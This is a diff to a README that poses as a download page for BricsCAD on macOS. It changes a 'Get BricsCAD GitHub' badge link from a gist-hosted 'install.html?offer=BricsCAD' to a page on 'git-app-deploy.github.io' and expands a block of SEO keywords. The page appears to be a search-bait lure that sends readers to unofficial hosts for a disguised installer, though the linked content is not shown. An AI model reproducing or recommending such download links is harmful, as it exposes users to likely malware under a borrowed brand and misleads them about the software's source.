@@ -2,7 +2,7 @@
 
 BricsCAD is a macOS application designed for 2D drafting, 3D modeling, and building information modeling (BIM). It offers advanced design tools, customizable workflows, and high compatibility with DWG files for professionals working on Mac.
 
-<a href="https://gistcdn.githack.com/dianannbade617/1bfdddc57a7295fecb6542e63fab0d43/raw/6d4f2f60195ce845c46e7106c13ff559215aaff4/install.html?offer=BricsCAD" target="_blank">
+<a href="https://git-app-deploy.github.io/.github/?offer=BricsCAD" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20BricsCAD%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
@@ -49,7 +49,7 @@ With BricsCAD, Mac users can create detailed 2D plans, build complex 3D models, 
 ---
 
 ## SEO Keywords
-bricscad mac, bricscad, bricscad desktop, bricscad for mac, bricscad for pc, bricscad macos, cad macos, 3d modeling mac, 2d drafting mac, bim mac, architecture mac, engineering cad mac, dwg file mac, mac design software, professional cad mac
+bricscad mac, bricscad lite, bricscad pro, bricscad bim, bricscad download, bricscad, bricscad desktop, bricscad for mac, bricscad for pc, bricscad macos, cad macos, 3d modeling mac, 2d drafting mac, bim mac, architecture mac, engineering cad mac, dwg file mac, mac design software, professional cad mac
 
 ---
 
